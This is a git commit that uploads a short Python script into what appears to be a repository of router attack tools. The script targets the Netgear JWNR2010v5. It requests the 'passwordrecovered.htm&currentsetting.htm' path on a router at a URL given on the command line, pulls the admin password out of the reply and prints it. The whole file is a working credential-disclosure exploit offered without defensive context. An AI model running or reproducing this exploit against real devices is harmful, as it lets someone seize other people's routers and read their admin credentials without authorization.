9e136977d9fd1073ac38941c0e896636751499e0
東 <36947254+D0neMkj@users.noreply.github.com>
2018-03-27 13:58:28 +0800

    Add files via upload

---
+++ ROUTER/NETGEAR/JWNR2010V5.py
@@ -0,0 +1,15 @@
+import requests
+import re
+import sys
+
+#jwmr2010v5.py http://xxx.xxx.xxx.xxx
+
+def showpass(url):
+	url = url + '/passwordrecovered.htm&currentsetting.htm'
+	header = {}
+	res = requests.get(url, headers=header, verify=False, timeout=8)
+	index = re.findall(">:\S+<",res.content,re.IGNORECASE)
+	print 'admin:'+index[1][8:-1]
+
+if __name__ == "__main__":
+	showpass(sys.argv[1])
